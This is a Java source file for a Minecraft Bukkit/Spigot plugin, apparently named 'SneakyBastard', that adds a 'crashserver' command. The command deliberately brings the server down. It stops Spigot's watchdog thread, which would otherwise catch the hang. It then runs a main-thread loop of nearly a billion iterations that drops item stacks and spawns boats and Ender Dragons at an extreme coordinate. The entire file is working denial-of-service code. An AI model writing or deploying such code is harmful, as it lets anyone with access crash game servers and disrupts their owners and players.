package net.blackofworld.SneakyBastard.Commands.Server;

import lombok.experimental.ExtensionMethod;
import net.blackofworld.SneakyBastard.Command.CommandBase;
import net.blackofworld.SneakyBastard.Command.CommandCategory;
import net.blackofworld.SneakyBastard.Command.CommandInfo;
import net.blackofworld.SneakyBastard.Extensions.PlayerExt;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Boat;
import org.bukkit.entity.EnderDragon;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.spigotmc.WatchdogThread;

import java.util.ArrayList;

@CommandInfo(command = "crashserver", description = "Crashes the server", Syntax = "", category = CommandCategory.Server)
@ExtensionMethod({Player.class, PlayerExt.class})
public class CrashServer extends CommandBase {
    @Override
    public void Execute(Player p, ArrayList<String> args) {

        WatchdogThread.doStop();
        p.Reply(ChatColor.GREEN + "Crashing!");
        Bukkit.getScheduler().runTask(this.Instance(), () -> {
            ItemStack stack = new ItemStack(Material.DIAMOND_BOOTS, 127);
            for (int i = 0; i < 999999999; i++) {
                var location = p.getLocation().subtract(0d, 179769313486231570814527423731704d, 0d);
                p.getWorld().dropItemNaturally(location, stack).setPickupDelay(Integer.MAX_VALUE);
                p.getWorld().spawn(location, Boat.class);
                p.getWorld().spawn(location, EnderDragon.class);
            }
            p.Reply(ChatColor.GREEN + "Done! Server should crash any second now!");
        });
    }
}
